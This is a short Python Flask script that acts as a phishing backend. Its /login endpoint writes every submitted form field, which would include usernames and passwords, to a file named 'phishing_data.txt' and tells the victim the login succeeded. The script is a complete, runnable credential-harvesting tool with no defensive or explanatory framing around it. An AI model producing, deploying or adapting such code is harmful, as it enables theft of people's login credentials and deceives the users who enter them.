from flask import Flask, request

app = Flask(__name__)

@app.route('/login', methods=['POST'])
def login():
    data = request.form
    with open('phishing_data.txt', 'a') as f:
        f.write(str(data) + '\n')
    return 'Login successful!', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=800)
